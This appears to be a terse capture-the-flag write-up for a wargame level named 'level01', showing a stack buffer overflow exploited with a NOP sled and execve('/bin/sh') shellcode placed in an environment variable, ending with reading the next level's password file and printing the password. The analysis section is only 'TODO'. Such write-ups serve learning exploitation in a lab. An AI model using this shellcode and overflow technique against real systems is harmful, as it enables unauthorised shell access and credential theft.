### step 1: Decompile with Ghidra

- We get the c source code of the program
- The binary is in 32-bits

```
file level01
level01: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=46d63f92a3bb0a950cf71dd3a5a630ade86057ab, not stripped
```

### step 2: Code analysis

TODO

Enter Username: dat_will

( python -c 'print("dat_will")' ; python -c 'print("A" * 79)') | ./level01

deuxième input segfault au 80eme char


env -i SHELLCODE=$(python -c 'print("\x90" * 512 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")') gdb level01


Our nopesled spans from 0xffffddae to 0xffffdfae, so we target the middle 0xffffdeae.

0xffffdeae => little endian \xae\xde\xff\xff


( python -c 'print("dat_will")' ; python -c 'print("A" * 80 + "\xae\xde\xff\xff")' ; cat ) | env -i SHELLCODE=$(python -c 'print("\x90" * 512 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")') ./level01

cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv